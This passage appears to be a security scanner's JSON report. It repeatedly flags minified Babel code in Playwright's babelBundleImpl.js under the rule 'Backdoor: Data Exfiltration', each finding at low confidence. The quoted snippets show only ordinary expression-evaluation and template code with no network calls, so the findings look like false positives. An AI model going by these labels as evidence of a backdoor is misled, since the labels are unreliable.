            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 2426,
                  "endLine": 66,
                  "endColumn": 2431,
                  "snippet": {
                    "text": "xpression:Io,toExpression:Woe,unaryExpression:Koe}=Ioe;function Goe(){let e;if(this.isMemberExpression())e=this.node.property;else if(this.isProperty()||this.isMethod())e=this.node.key;else throw new ReferenceError(\"todo\");return this.node.computed||koe(e)&&(e=WA(e.name)),e}function Hoe(){let e=this.get(\"body\"),t=e.node;if(Array.isArray(e))throw new Error(\"Can't convert array path to a block statement\");if(!t)throw new Error(\"Can't convert node without a body\");if(e.isBlockStatement())return t;let r=[],n=\"body\",s,i;e.isStatement()?(i=\"body\",s=0,r.push(e.node)):(n+=\".body.0\",this.isFunction()?(s=\"ar",
                    "rendered": {
                      "text": "xpression:Io,toExpression:Woe,unaryExpression:Koe}=Ioe;function Goe(){let e;if(this.isMemberExpression())e=this.node.property;else if(this.isProperty()||this.isMethod())e=this.node.key;else throw new ReferenceError(\"todo\");return this.node.computed||koe(e)&&(e=WA(e.name)),e}function Hoe(){let e=this.get(\"body\"),t=e.node;if(Array.isArray(e))throw new Error(\"Can't convert array path to a block statement\");if(!t)throw new Error(\"Can't convert node without a body\");if(e.isBlockStatement())return t;let r=[],n=\"body\",s,i;e.isStatement()?(i=\"body\",s=0,r.push(e.node)):(n+=\".body.0\",this.isFunction()?(s=\"ar",
                      "markdown": "`xpression:Io,toExpression:Woe,unaryExpression:Koe}=Ioe;function Goe(){let e;if(this.isMemberExpression())e=this.node.property;else if(this.isProperty()||this.isMethod())e=this.node.key;else throw new ReferenceError(\"todo\");return this.node.computed||koe(e)&&(e=WA(e.name)),e}function Hoe(){let e=this.get(\"body\"),t=e.node;if(Array.isArray(e))throw new Error(\"Can't convert array path to a block statement\");if(!t)throw new Error(\"Can't convert node without a body\");if(e.isBlockStatement())return t;let r=[],n=\"body\",s,i;e.isStatement()?(i=\"body\",s=0,r.push(e.node)):(n+=\".body.0\",this.isFunction()?(s=\"ar`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 3396,
                  "endLine": 38,
                  "endColumn": 3401,
                  "snippet": {
                    "text": "erge)(s,(0,gn.validate)(i)))}throw new Error(`Unexpected template param ${typeof i}`)},{ast:(i,...a)=>{if(typeof i==\"string\"){if(a.length>1)throw new Error(\"Unexpected extra params.\");return(0,NA.default)(e,i,(0,gn.merge)((0,gn.merge)(s,(0,gn.validate)(a[0])),BA))()}else if(Array.isArray(i)){let o=n.get(i);return o||(o=(0,kA.default)(e,i,(0,gn.merge)(s,BA)),n.set(i,o)),o(a)()}throw new Error(`Unexpected template param ${typeof i}`)}})}function FA(e){let t=\"\";try{throw new Error}catch(r){r.stack&&(t=r.stack.split(`\n`).slice(3).join(`\n`))}return r=>{try{return e(r)}catch(n){throw n.stack+=`\n    =====",
                    "rendered": {
                      "text": "erge)(s,(0,gn.validate)(i)))}throw new Error(`Unexpected template param ${typeof i}`)},{ast:(i,...a)=>{if(typeof i==\"string\"){if(a.length>1)throw new Error(\"Unexpected extra params.\");return(0,NA.default)(e,i,(0,gn.merge)((0,gn.merge)(s,(0,gn.validate)(a[0])),BA))()}else if(Array.isArray(i)){let o=n.get(i);return o||(o=(0,kA.default)(e,i,(0,gn.merge)(s,BA)),n.set(i,o)),o(a)()}throw new Error(`Unexpected template param ${typeof i}`)}})}function FA(e){let t=\"\";try{throw new Error}catch(r){r.stack&&(t=r.stack.split(`\n`).slice(3).join(`\n`))}return r=>{try{return e(r)}catch(n){throw n.stack+=`\n    =====",
                      "markdown": "`erge)(s,(0,gn.validate)(i)))}throw new Error(`Unexpected template param ${typeof i}`)},{ast:(i,...a)=>{if(typeof i==\"string\"){if(a.length>1)throw new Error(\"Unexpected extra params.\");return(0,NA.default)(e,i,(0,gn.merge)((0,gn.merge)(s,(0,gn.validate)(a[0])),BA))()}else if(Array.isArray(i)){let o=n.get(i);return o||(o=(0,kA.default)(e,i,(0,gn.merge)(s,BA)),n.set(i,o)),o(a)()}throw new Error(`Unexpected template param ${typeof i}`)}})}function FA(e){let t=\"\";try{throw new Error}catch(r){r.stack&&(t=r.stack.split(`\n`).slice(3).join(`\n`))}return r=>{try{return e(r)}catch(n){throw n.stack+=`\n    =====`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 2924,
                  "endLine": 38,
                  "endColumn": 2929,
                  "snippet": {
                    "text": "ern:!1});function jA(e,t){let r=new WeakMap,n=new WeakMap,s=t||(0,gn.validate)(null);return Object.assign((i,...a)=>{if(typeof i==\"string\"){if(a.length>1)throw new Error(\"Unexpected extra params.\");return FA((0,NA.default)(e,i,(0,gn.merge)(s,(0,gn.validate)(a[0]))))}else if(Array.isArray(i)){let o=r.get(i);return o||(o=(0,kA.default)(e,i,s),r.set(i,o)),FA(o(a))}else if(typeof i==\"object\"&&i){if(a.length>0)throw new Error(\"Unexpected extra params.\");return jA(e,(0,gn.merge)(s,(0,gn.validate)(i)))}throw new Error(`Unexpected template param ${typeof i}`)},{ast:(i,...a)=>{if(typeof i==\"string\"){if(a.le",
                    "rendered": {
                      "text": "ern:!1});function jA(e,t){let r=new WeakMap,n=new WeakMap,s=t||(0,gn.validate)(null);return Object.assign((i,...a)=>{if(typeof i==\"string\"){if(a.length>1)throw new Error(\"Unexpected extra params.\");return FA((0,NA.default)(e,i,(0,gn.merge)(s,(0,gn.validate)(a[0]))))}else if(Array.isArray(i)){let o=r.get(i);return o||(o=(0,kA.default)(e,i,s),r.set(i,o)),FA(o(a))}else if(typeof i==\"object\"&&i){if(a.length>0)throw new Error(\"Unexpected extra params.\");return jA(e,(0,gn.merge)(s,(0,gn.validate)(i)))}throw new Error(`Unexpected template param ${typeof i}`)},{ast:(i,...a)=>{if(typeof i==\"string\"){if(a.le",
                      "markdown": "`ern:!1});function jA(e,t){let r=new WeakMap,n=new WeakMap,s=t||(0,gn.validate)(null);return Object.assign((i,...a)=>{if(typeof i==\"string\"){if(a.length>1)throw new Error(\"Unexpected extra params.\");return FA((0,NA.default)(e,i,(0,gn.merge)(s,(0,gn.validate)(a[0]))))}else if(Array.isArray(i)){let o=r.get(i);return o||(o=(0,kA.default)(e,i,s),r.set(i,o)),FA(o(a))}else if(typeof i==\"object\"&&i){if(a.length>0)throw new Error(\"Unexpected extra params.\");return jA(e,(0,gn.merge)(s,(0,gn.validate)(i)))}throw new Error(`Unexpected template param ${typeof i}`)},{ast:(i,...a)=>{if(typeof i==\"string\"){if(a.le`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 8475,
                  "endLine": 31,
                  "endColumn": 8480,
                  "snippet": {
                    "text": "sLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i=e.get(\"arguments\").map(a=>gr(a,t));return t.confident?s.apply(n,i):void 0}}Ln(e,t)}}function PA(e,t,r,n=!1){let s=\"\",i=0,a=e.isTemplateLiteral()?e.get(\"expressions\"):e.get(\"quasi.expressions\");for(let o of t){if(!r.confident)break;s+=n?o.value.raw:o.value.cooked;let l=a[i++];l&&(s+=String(gr(l,r)))}if(r.confident)return s}function mae(){let e={confident:!0,deoptPath:null,seen:new Map},t=gr(this,e);return e.confident||(t=void 0),{confident:e.confident,deopt:e.deoptPath",
                    "rendered": {
                      "text": "sLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i=e.get(\"arguments\").map(a=>gr(a,t));return t.confident?s.apply(n,i):void 0}}Ln(e,t)}}function PA(e,t,r,n=!1){let s=\"\",i=0,a=e.isTemplateLiteral()?e.get(\"expressions\"):e.get(\"quasi.expressions\");for(let o of t){if(!r.confident)break;s+=n?o.value.raw:o.value.cooked;let l=a[i++];l&&(s+=String(gr(l,r)))}if(r.confident)return s}function mae(){let e={confident:!0,deoptPath:null,seen:new Map},t=gr(this,e);return e.confident||(t=void 0),{confident:e.confident,deopt:e.deoptPath",
                      "markdown": "`sLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i=e.get(\"arguments\").map(a=>gr(a,t));return t.confident?s.apply(n,i):void 0}}Ln(e,t)}}function PA(e,t,r,n=!1){let s=\"\",i=0,a=e.isTemplateLiteral()?e.get(\"expressions\"):e.get(\"quasi.expressions\");for(let o of t){if(!r.confident)break;s+=n?o.value.raw:o.value.cooked;let l=a[i++];l&&(s+=String(gr(l,r)))}if(r.confident)return s}function mae(){let e={confident:!0,deoptPath:null,seen:new Map},t=gr(this,e);return e.confident||(t=void 0),{confident:e.confident,deopt:e.deoptPath`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 8454,
                  "endLine": 31,
                  "endColumn": 8459,
                  "snippet": {
                    "text": "n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i=e.get(\"arguments\").map(a=>gr(a,t));return t.confident?s.apply(n,i):void 0}}Ln(e,t)}}function PA(e,t,r,n=!1){let s=\"\",i=0,a=e.isTemplateLiteral()?e.get(\"expressions\"):e.get(\"quasi.expressions\");for(let o of t){if(!r.confident)break;s+=n?o.value.raw:o.value.cooked;let l=a[i++];l&&(s+=String(gr(l,r)))}if(r.confident)return s}function mae(){let e={confident:!0,deoptPath:null,seen:new Map},t=gr(this,e);return e.confident||(t=void 0),{confident:e.confid",
                    "rendered": {
                      "text": "n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i=e.get(\"arguments\").map(a=>gr(a,t));return t.confident?s.apply(n,i):void 0}}Ln(e,t)}}function PA(e,t,r,n=!1){let s=\"\",i=0,a=e.isTemplateLiteral()?e.get(\"expressions\"):e.get(\"quasi.expressions\");for(let o of t){if(!r.confident)break;s+=n?o.value.raw:o.value.cooked;let l=a[i++];l&&(s+=String(gr(l,r)))}if(r.confident)return s}function mae(){let e={confident:!0,deoptPath:null,seen:new Map},t=gr(this,e);return e.confident||(t=void 0),{confident:e.confid",
                      "markdown": "`n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i=e.get(\"arguments\").map(a=>gr(a,t));return t.confident?s.apply(n,i):void 0}}Ln(e,t)}}function PA(e,t,r,n=!1){let s=\"\",i=0,a=e.isTemplateLiteral()?e.get(\"expressions\"):e.get(\"quasi.expressions\");for(let o of t){if(!r.confident)break;s+=n?o.value.raw:o.value.cooked;let l=a[i++];l&&(s+=String(gr(l,r)))}if(r.confident)return s}function mae(){let e={confident:!0,deoptPath:null,seen:new Map},t=gr(this,e);return e.confident||(t=void 0),{confident:e.confid`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 8309,
                  "endLine": 31,
                  "endColumn": 8314,
                  "snippet": {
                    "text": "roperty\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a.node.name;hasOwnProperty.call(n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i=e.get(\"arguments\").map(a=>gr(a,t));return t.confident?s.apply(n,i):void 0}}Ln(e,t)}}function PA(e,t,r,n=!1){let s=\"\",i=0,a=e.isTemplateLiteral()?e.get(\"expressions\"):e.get(\"quasi.expressions\");for(let o of t){if(!r.confident)break;s+=n?o.value.raw:o.value.cooked;let l=a[i++];l&&(s+=String(gr(l,r)))}if(r.c",
                    "rendered": {
                      "text": "roperty\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a.node.name;hasOwnProperty.call(n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i=e.get(\"arguments\").map(a=>gr(a,t));return t.confident?s.apply(n,i):void 0}}Ln(e,t)}}function PA(e,t,r,n=!1){let s=\"\",i=0,a=e.isTemplateLiteral()?e.get(\"expressions\"):e.get(\"quasi.expressions\");for(let o of t){if(!r.confident)break;s+=n?o.value.raw:o.value.cooked;let l=a[i++];l&&(s+=String(gr(l,r)))}if(r.c",
                      "markdown": "`roperty\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a.node.name;hasOwnProperty.call(n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i=e.get(\"arguments\").map(a=>gr(a,t));return t.confident?s.apply(n,i):void 0}}Ln(e,t)}}function PA(e,t,r,n=!1){let s=\"\",i=0,a=e.isTemplateLiteral()?e.get(\"expressions\"):e.get(\"quasi.expressions\");for(let o of t){if(!r.confident)break;s+=n?o.value.raw:o.value.cooked;let l=a[i++];l&&(s+=String(gr(l,r)))}if(r.c`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 8002,
                  "endLine": 31,
                  "endColumn": 8007,
                  "snippet": {
                    "text": "ase\"^\":return r^n;case\"<<\":return r<<n;case\">>\":return r>>n;case\">>>\":return r>>>n}}if(e.isCallExpression()){let r=e.get(\"callee\"),n,s;if(r.isIdentifier()&&!e.scope.getBinding(r.node.name)&&(SA(r.node.name)||fae(r.node.name))&&(s=global[r.node.name]),r.isMemberExpression()){let i=r.get(\"object\"),a=r.get(\"property\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a.node.name;hasOwnProperty.call(n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i",
                    "rendered": {
                      "text": "ase\"^\":return r^n;case\"<<\":return r<<n;case\">>\":return r>>n;case\">>>\":return r>>>n}}if(e.isCallExpression()){let r=e.get(\"callee\"),n,s;if(r.isIdentifier()&&!e.scope.getBinding(r.node.name)&&(SA(r.node.name)||fae(r.node.name))&&(s=global[r.node.name]),r.isMemberExpression()){let i=r.get(\"object\"),a=r.get(\"property\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a.node.name;hasOwnProperty.call(n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i",
                      "markdown": "`ase\"^\":return r^n;case\"<<\":return r<<n;case\">>\":return r>>n;case\">>>\":return r>>>n}}if(e.isCallExpression()){let r=e.get(\"callee\"),n,s;if(r.isIdentifier()&&!e.scope.getBinding(r.node.name)&&(SA(r.node.name)||fae(r.node.name))&&(s=global[r.node.name]),r.isMemberExpression()){let i=r.get(\"object\"),a=r.get(\"property\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a.node.name;hasOwnProperty.call(n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.name])}}if(s){let i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 7984,
                  "endLine": 31,
                  "endColumn": 7989,
                  "snippet": {
                    "text": "se\"&\":return r&n;case\"^\":return r^n;case\"<<\":return r<<n;case\">>\":return r>>n;case\">>>\":return r>>>n}}if(e.isCallExpression()){let r=e.get(\"callee\"),n,s;if(r.isIdentifier()&&!e.scope.getBinding(r.node.name)&&(SA(r.node.name)||fae(r.node.name))&&(s=global[r.node.name]),r.isMemberExpression()){let i=r.get(\"object\"),a=r.get(\"property\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a.node.name;hasOwnProperty.call(n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.n",
                    "rendered": {
                      "text": "se\"&\":return r&n;case\"^\":return r^n;case\"<<\":return r<<n;case\">>\":return r>>n;case\">>>\":return r>>>n}}if(e.isCallExpression()){let r=e.get(\"callee\"),n,s;if(r.isIdentifier()&&!e.scope.getBinding(r.node.name)&&(SA(r.node.name)||fae(r.node.name))&&(s=global[r.node.name]),r.isMemberExpression()){let i=r.get(\"object\"),a=r.get(\"property\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a.node.name;hasOwnProperty.call(n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.n",
                      "markdown": "`se\"&\":return r&n;case\"^\":return r^n;case\"<<\":return r<<n;case\">>\":return r>>n;case\">>>\":return r>>>n}}if(e.isCallExpression()){let r=e.get(\"callee\"),n,s;if(r.isIdentifier()&&!e.scope.getBinding(r.node.name)&&(SA(r.node.name)||fae(r.node.name))&&(s=global[r.node.name]),r.isMemberExpression()){let i=r.get(\"object\"),a=r.get(\"property\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a.node.name;hasOwnProperty.call(n,o)&&(s=n[o])}if(i.isLiteral()&&a.isIdentifier()){let o=typeof i.node.value;(o===\"string\"||o===\"number\")&&(n=i.node.value,s=n[a.node.n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 7818,
                  "endLine": 31,
                  "endColumn": 7823,
                  "snippet": {
                    "text": "\">\":return r>n;case\"<=\":return r<=n;case\">=\":return r>=n;case\"==\":return r==n;case\"!=\":return r!=n;case\"===\":return r===n;case\"!==\":return r!==n;case\"|\":return r|n;case\"&\":return r&n;case\"^\":return r^n;case\"<<\":return r<<n;case\">>\":return r>>n;case\">>>\":return r>>>n}}if(e.isCallExpression()){let r=e.get(\"callee\"),n,s;if(r.isIdentifier()&&!e.scope.getBinding(r.node.name)&&(SA(r.node.name)||fae(r.node.name))&&(s=global[r.node.name]),r.isMemberExpression()){let i=r.get(\"object\"),a=r.get(\"property\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a",
                    "rendered": {
                      "text": "\">\":return r>n;case\"<=\":return r<=n;case\">=\":return r>=n;case\"==\":return r==n;case\"!=\":return r!=n;case\"===\":return r===n;case\"!==\":return r!==n;case\"|\":return r|n;case\"&\":return r&n;case\"^\":return r^n;case\"<<\":return r<<n;case\">>\":return r>>n;case\">>>\":return r>>>n}}if(e.isCallExpression()){let r=e.get(\"callee\"),n,s;if(r.isIdentifier()&&!e.scope.getBinding(r.node.name)&&(SA(r.node.name)||fae(r.node.name))&&(s=global[r.node.name]),r.isMemberExpression()){let i=r.get(\"object\"),a=r.get(\"property\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a",
                      "markdown": "`\">\":return r>n;case\"<=\":return r<=n;case\">=\":return r>=n;case\"==\":return r==n;case\"!=\":return r!=n;case\"===\":return r===n;case\"!==\":return r!==n;case\"|\":return r|n;case\"&\":return r&n;case\"^\":return r^n;case\"<<\":return r<<n;case\">>\":return r>>n;case\">>>\":return r>>>n}}if(e.isCallExpression()){let r=e.get(\"callee\"),n,s;if(r.isIdentifier()&&!e.scope.getBinding(r.node.name)&&(SA(r.node.name)||fae(r.node.name))&&(s=global[r.node.name]),r.isMemberExpression()){let i=r.get(\"object\"),a=r.get(\"property\");if(i.isIdentifier()&&a.isIdentifier()&&SA(i.node.name)&&!pae(a.node.name)){n=global[i.node.name];let o=a`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 7306,
                  "endLine": 31,
                  "endColumn": 7311,
                  "snippet": {
                    "text": ".operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:void 0}}if(e.isBinaryExpression()){let r=gr(e.get(\"left\"),t);if(!t.confident)return;let n=gr(e.get(\"right\"),t);if(!t.confident)return;switch(e.node.operator){case\"-\":return r-n;case\"+\":return r+n;case\"/\":return r/n;case\"*\":return r*n;case\"%\":return r%n;case\"**\":return Math.pow(r,n);case\"<\":return r<n;case\">\":return r>n;case\"<=\":return r<=n;case\">=\":return r>=n;case\"==\":return r==n;case\"!=\":return",
                    "rendered": {
                      "text": ".operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:void 0}}if(e.isBinaryExpression()){let r=gr(e.get(\"left\"),t);if(!t.confident)return;let n=gr(e.get(\"right\"),t);if(!t.confident)return;switch(e.node.operator){case\"-\":return r-n;case\"+\":return r+n;case\"/\":return r/n;case\"*\":return r*n;case\"%\":return r%n;case\"**\":return Math.pow(r,n);case\"<\":return r<n;case\">\":return r>n;case\"<=\":return r<=n;case\">=\":return r>=n;case\"==\":return r==n;case\"!=\":return",
                      "markdown": "`.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:void 0}}if(e.isBinaryExpression()){let r=gr(e.get(\"left\"),t);if(!t.confident)return;let n=gr(e.get(\"right\"),t);if(!t.confident)return;switch(e.node.operator){case\"-\":return r-n;case\"+\":return r+n;case\"/\":return r/n;case\"*\":return r*n;case\"%\":return r%n;case\"**\":return Math.pow(r,n);case\"<\":return r<n;case\">\":return r>n;case\"<=\":return r<=n;case\">=\":return r>=n;case\"==\":return r==n;case\"!=\":return`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 7257,
                  "endLine": 31,
                  "endColumn": 7262,
                  "snippet": {
                    "text": "=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:void 0}}if(e.isBinaryExpression()){let r=gr(e.get(\"left\"),t);if(!t.confident)return;let n=gr(e.get(\"right\"),t);if(!t.confident)return;switch(e.node.operator){case\"-\":return r-n;case\"+\":return r+n;case\"/\":return r/n;case\"*\":return r*n;case\"%\":return r%n;case\"**\":return Math.pow(r,n);case\"<\":return r<n;case\">\":return r>n;case\"<=\":return r<=n;case\">=\"",
                    "rendered": {
                      "text": "=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:void 0}}if(e.isBinaryExpression()){let r=gr(e.get(\"left\"),t);if(!t.confident)return;let n=gr(e.get(\"right\"),t);if(!t.confident)return;switch(e.node.operator){case\"-\":return r-n;case\"+\":return r+n;case\"/\":return r/n;case\"*\":return r*n;case\"%\":return r%n;case\"**\":return Math.pow(r,n);case\"<\":return r<n;case\">\":return r>n;case\"<=\":return r<=n;case\">=\"",
                      "markdown": "`=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:void 0}}if(e.isBinaryExpression()){let r=gr(e.get(\"left\"),t);if(!t.confident)return;let n=gr(e.get(\"right\"),t);if(!t.confident)return;switch(e.node.operator){case\"-\":return r-n;case\"+\":return r+n;case\"/\":return r/n;case\"*\":return r*n;case\"%\":return r%n;case\"**\":return Math.pow(r,n);case\"<\":return r<n;case\">\":return r>n;case\"<=\":return r<=n;case\">=\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
